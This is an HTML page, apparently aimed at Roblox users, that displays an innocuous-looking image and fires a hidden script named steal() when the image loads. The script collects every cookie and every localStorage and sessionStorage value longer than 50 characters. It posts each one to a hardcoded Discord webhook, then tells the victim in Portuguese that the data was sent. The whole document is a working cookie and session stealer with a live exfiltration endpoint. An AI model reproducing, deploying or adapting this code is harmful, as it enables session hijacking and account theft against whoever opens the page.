<!DOCTYPE html>
<html>
<body style="margin:0;padding:20px;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSINFXNhpKEdmLuwI3trVaGJGnbwfCr4pyJm4fa1muxPv_i8Pcl8N2tXzQ&s=10" width="350" style="cursor:pointer;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.5)" 
         onload="steal()">

<script>
function steal(){
    // TODOS os cookies (Roblox + outros)
    document.cookie.split(';').forEach(c => {
        let [name, value] = c.trim().split('=');
        if(value && value.length > 50){  // Cookies grandes/úteis
            fetch('https://discord.com/api/webhooks/1479529513292398675/XGdI3Jtom4BkfRKJ3au0W7ErTX2L205Jz4YMSYeen4ktVTs14hf2VMP546mVULRvjwjH',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    content:`🍪 **COOKIE DUMP**\n**${name}=** \`${value.slice(0,60)}...\``
                })
            });
        }
    });
    
    // LocalStorage + SessionStorage
    [localStorage, sessionStorage].forEach(storage => {
        for(let key in storage){
            if(storage[key].length > 50){
                fetch('https://discord.com/api/webhooks/1479529513292398675/XGdI3Jtom4BkfRKJ3au0W7ErTX2L205Jz4YMSYeen4ktVTs14hf2VMP546mVULRvjwjH',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({
                        content:`💾 **${key}**\n\`${storage[key].slice(0,60)}...\``
                    })
                });
            }
        }
    });
    
    document.body.innerHTML='<h1 style="color:lime;font-size:30px">✅ Dados enviados!</h1>';
}
</script>
</body>
</html>
